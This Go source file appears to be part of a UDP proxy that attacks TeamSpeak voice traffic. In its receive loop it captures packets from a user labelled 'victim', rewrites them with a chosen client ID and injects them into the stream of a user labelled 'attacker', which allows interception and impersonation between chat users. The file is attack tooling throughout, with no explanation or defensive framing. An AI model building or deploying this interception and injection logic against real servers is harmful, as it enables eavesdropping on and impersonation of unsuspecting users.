package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"time"
)

func (user *userClient) sendPacketToTeamspeak(c *net.UDPConn) {
	for {
		select {
		case res := <-user.incomingPackets:
			_, err := c.Write(res)
			if err != nil {
				fmt.Println(err)
				return
			}
			if len(res) == 13 {
				user.last13 = res[0:8]
			}
		case <-time.After(60 * time.Second):
			fmt.Printf("Delete connection %v \n", user.userAddressIP)
			user.end <- 1
			delete(user.proxy.usersMap, user.userAddressIP)
			return
		}
	}
}

func (user *userClient) receivePacketFromTeamspeak(c *net.UDPConn) {
	clientID := make([]byte, 2)
	for {
		select {
		case <-user.end:
			return
		default:
		}

		if user.proxy.outputUser != 0 {
			binary.LittleEndian.PutUint16(clientID, user.proxy.outputUser)
		}

		if user.proxy.startCapture && user.userAddressIP == user.proxy.attacker {
			select {
			case res := <-user.injectPacket:
				if len(res.data) <= 17 {
					continue
				}

				if res.typeOfPacket == "out" {
					res.data = user.preparePacketOut(res.data, clientID)
				}
				if res.typeOfPacket == "in" {
					res.data = user.preparePacketIn(res.data, clientID)
				}

				user.proxy.clientToProxy <- &packet{data: res.data, address: user.userAddressIP}
			default:
				buffer := make([]byte, 4096)
				n, _, err := c.ReadFromUDP(buffer)
				if err != nil {
					fmt.Println(err)
					return
				}
				user.proxy.clientToProxy <- &packet{data: buffer[0:n], address: user.userAddressIP}
			}
		} else {
			buffer := make([]byte, 4096)
			n, _, err := c.ReadFromUDP(buffer)
			if err != nil {
				fmt.Println(err)
				return
			}
			if user.userAddressIP == user.proxy.victim && user.proxy.startCapture {
				user.proxy.usersMap[user.proxy.attacker].injectPacket <- capturePacket{data: buffer[0:n], typeOfPacket: "out"}
			}
			if user.last13 != nil {
				if n > 18 && buffer[0] == user.last13[0] && buffer[7] == user.last13[7] {
					user.lastTalkId = buffer[8:10]
				}
			}
			user.proxy.clientToProxy <- &packet{data: buffer[0:n], address: user.userAddressIP}
		}
	}
}
